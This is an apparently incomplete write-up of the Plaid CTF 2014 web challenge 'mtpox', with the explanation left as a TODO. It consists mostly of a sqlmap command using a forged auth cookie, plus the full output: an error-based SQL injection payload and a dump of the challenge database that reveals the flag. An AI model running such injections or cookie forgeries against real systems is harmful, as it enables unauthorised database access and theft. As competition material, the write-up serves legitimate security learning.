# Plaid CTF 2014: mtpox

**Category:** Web
**Points:** 150
**Description:**

> The Plague has traveled back in time to create a cryptocurrency before Satoshi does in an attempt to quickly gain the resources required for his empire. As you step out of your time machine, you learn [his exchange](http://54.211.6.40/) has stopped trades, due to some sort of bug. However, if you could break into the database and show a different story of where the coins went, we might be able to stop The Plague.
>
> Hint: try reading things using `?page=`.

## Write-up

(TODO)

```
$ sqlmap.py -u 'http://54.211.6.40/admin.php?query=abc' --cookie='auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' --dump-all

    sqlmap/0.9 - automatic SQL injection and database takeover tool
    http://sqlmap.sourceforge.net

[*] starting at: 21:23:38

[21:23:38] [INFO] using '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/session' as session file
[21:23:38] [INFO] testing connection to the target url
[21:23:38] [INFO] testing if the url is stable, wait a few seconds
[21:23:40] [INFO] url is stable
[21:23:40] [INFO] testing if GET parameter 'query' is dynamic
[21:23:40] [INFO] confirming that GET parameter 'query' is dynamic
[21:23:40] [INFO] GET parameter 'query' is dynamic
[21:23:40] [INFO] heuristic test shows that GET parameter 'query' might be injectable (possible DBMS: MySQL)
[21:23:40] [INFO] testing sql injection on GET parameter 'query'
[21:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:23:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[21:23:43] [INFO] GET parameter 'query' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
[21:23:43] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[21:23:43] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[21:23:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[21:23:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
GET parameter 'query' is vulnerable. Do you want to keep testing the others? [y/N] y
sqlmap identified the following injection points with a total of 33 HTTP(s) requests:
---
Place: GET
Parameter: query
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: query=abc AND (SELECT 1000 FROM(SELECT COUNT(*),CONCAT(CHAR(58,98,119,100,58),(SELECT (CASE WHEN (1000=1000) THEN 1 ELSE 0 END)),CHAR(58,108,110,101,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
---

[21:25:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian or Ubuntu
web application technology: Apache 2.2.22, PHP 5.4.4
back-end DBMS: MySQL 5.0
[21:25:35] [INFO] sqlmap will dump entries of all databases' tables now
[21:25:35] [INFO] fetching tables
[21:25:35] [INFO] fetching database names
[21:25:35] [INFO] the SQL query used returns 2 entries
[21:25:35] [INFO] retrieved: information_schema
[21:25:35] [INFO] retrieved: mtpox
[21:25:35] [INFO] the SQL query used returns 41 entries
[21:25:36] [INFO] retrieved: information_schema
[21:25:36] [INFO] retrieved: CHARACTER_SETS
[21:25:36] [INFO] retrieved: information_schema
[21:25:36] [INFO] retrieved: COLLATIONS
[21:25:36] [INFO] retrieved: information_schema
[21:25:37] [INFO] retrieved: COLLATION_CHARACTER_SET_APPLICABILITY
[21:25:37] [INFO] retrieved: information_schema
[21:25:37] [INFO] retrieved: COLUMNS
[21:25:37] [INFO] retrieved: information_schema
[21:25:38] [INFO] retrieved: COLUMN_PRIVILEGES
[21:25:38] [INFO] retrieved: information_schema
[21:25:38] [INFO] retrieved: ENGINES
[21:25:38] [INFO] retrieved: information_schema
[21:25:38] [INFO] retrieved: EVENTS
[21:25:39] [INFO] retrieved: information_schema
[21:25:39] [INFO] retrieved: FILES
[21:25:39] [INFO] retrieved: information_schema
[21:25:39] [INFO] retrieved: GLOBAL_STATUS
[21:25:39] [INFO] retrieved: information_schema
[21:25:40] [INFO] retrieved: GLOBAL_VARIABLES
[21:25:40] [INFO] retrieved: information_schema
[21:25:40] [INFO] retrieved: KEY_COLUMN_USAGE
[21:25:40] [INFO] retrieved: information_schema
[21:25:40] [INFO] retrieved: PARAMETERS
[21:25:41] [INFO] retrieved: information_schema
[21:25:41] [INFO] retrieved: PARTITIONS
[21:25:41] [INFO] retrieved: information_schema
[21:25:41] [INFO] retrieved: PLUGINS
[21:25:42] [INFO] retrieved: information_schema
[21:25:42] [INFO] retrieved: PROCESSLIST
[21:25:42] [INFO] retrieved: information_schema
[21:25:42] [INFO] retrieved: PROFILING
[21:25:42] [INFO] retrieved: information_schema
[21:25:43] [INFO] retrieved: REFERENTIAL_CONSTRAINTS
[21:25:43] [INFO] retrieved: information_schema
[21:25:43] [INFO] retrieved: ROUTINES
[21:25:43] [INFO] retrieved: information_schema
[21:25:43] [INFO] retrieved: SCHEMATA
[21:25:44] [INFO] retrieved: information_schema
[21:25:44] [INFO] retrieved: SCHEMA_PRIVILEGES
[21:25:44] [INFO] retrieved: information_schema
[21:25:44] [INFO] retrieved: SESSION_STATUS
[21:25:45] [INFO] retrieved: information_schema
[21:25:45] [INFO] retrieved: SESSION_VARIABLES
[21:25:45] [INFO] retrieved: information_schema
[21:25:45] [INFO] retrieved: STATISTICS
[21:25:45] [INFO] retrieved: information_schema
[21:25:46] [INFO] retrieved: TABLES
[21:25:46] [INFO] retrieved: information_schema
[21:25:46] [INFO] retrieved: TABLESPACES
[21:25:46] [INFO] retrieved: information_schema
[21:25:46] [INFO] retrieved: TABLE_CONSTRAINTS
[21:25:47] [INFO] retrieved: information_schema
[21:25:47] [INFO] retrieved: TABLE_PRIVILEGES
[21:25:47] [INFO] retrieved: information_schema
[21:25:47] [INFO] retrieved: TRIGGERS
[21:25:47] [INFO] retrieved: information_schema
[21:25:48] [INFO] retrieved: USER_PRIVILEGES
[21:25:48] [INFO] retrieved: information_schema
[21:25:48] [INFO] retrieved: VIEWS
[21:25:48] [INFO] retrieved: information_schema
[21:25:49] [INFO] retrieved: INNODB_BUFFER_PAGE
[21:25:49] [INFO] retrieved: information_schema
[21:25:49] [INFO] retrieved: INNODB_TRX
[21:25:49] [INFO] retrieved: information_schema
[21:25:49] [INFO] retrieved: INNODB_BUFFER_POOL_STATS
[21:25:50] [INFO] retrieved: information_schema
[21:25:50] [INFO] retrieved: INNODB_LOCK_WAITS
[21:25:50] [INFO] retrieved: information_schema
[21:25:50] [INFO] retrieved: INNODB_CMPMEM
[21:25:50] [INFO] retrieved: information_schema
[21:25:51] [INFO] retrieved: INNODB_CMP
[21:25:51] [INFO] retrieved: information_schema
[21:25:51] [INFO] retrieved: INNODB_LOCKS
[21:25:51] [INFO] retrieved: information_schema
[21:25:51] [INFO] retrieved: INNODB_CMPMEM_RESET
[21:25:52] [INFO] retrieved: information_schema
[21:25:52] [INFO] retrieved: INNODB_CMP_RESET
[21:25:52] [INFO] retrieved: information_schema
[21:25:52] [INFO] retrieved: INNODB_BUFFER_PAGE_LRU
[21:25:53] [INFO] retrieved: mtpox
[21:25:53] [INFO] retrieved: plaidcoin_wallets
[21:25:53] [INFO] fetching columns for table 'plaidcoin_wallets' on database 'mtpox'
[21:25:53] [INFO] the SQL query used returns 2 entries
[21:25:53] [INFO] retrieved: id
[21:25:54] [INFO] retrieved: varchar(40)
[21:25:54] [INFO] retrieved: amount
[21:25:54] [INFO] retrieved: int(30)
[21:25:54] [INFO] fetching entries for table 'plaidcoin_wallets' on database 'mtpox'
[21:25:54] [INFO] the SQL query used returns 1 entries
[21:25:54] [INFO] retrieved: 1333337
[21:25:55] [INFO] retrieved: flag{phpPhPphpPPPphpcoin}
Database: mtpox
Table: plaidcoin_wallets
[1 entry]
+---------+---------------------------+
| amount  | id                        |
+---------+---------------------------+
| 1333337 | flag{phpPhPphpPPPphpcoin} |
+---------+---------------------------+

[21:25:55] [INFO] Table 'mtpox.plaidcoin_wallets' dumped to CSV file '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/dump/mtpox/plaidcoin_wallets.csv'
[21:25:55] [INFO] fetching columns for table 'CHARACTER_SETS' on database 'information_schema'
[21:25:55] [INFO] the SQL query used returns 4 entries
[21:25:55] [INFO] retrieved: CHARACTER_SET_NAME
…
```

The flag is `flag{phpPhPphpPPPphpcoin}`.

## Other write-ups

* none yet
